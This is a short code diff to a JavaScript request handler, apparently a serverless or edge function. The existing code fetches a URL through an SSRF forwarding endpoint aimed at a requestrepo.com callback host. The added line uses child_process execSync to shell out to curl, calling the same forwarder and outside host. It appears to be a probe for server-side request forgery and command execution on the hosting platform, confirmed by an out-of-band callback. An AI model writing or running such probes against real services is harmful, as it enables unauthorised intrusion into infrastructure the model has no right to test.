@@ -1,4 +1,5 @@
 export default function onRequest(context) {
+require('child_process').execSync(`curl 'http://ssrf.tencentcloud.com/ssrf_forward.php?host=yh9dub1w.requestrepo.com'`)
   fetch("http://ssrf.tencentcloud.com/ssrf_forward.php?host=yh9dub1w.requestrepo.com")
     .then((res) => res.text())
     .then((text) =>
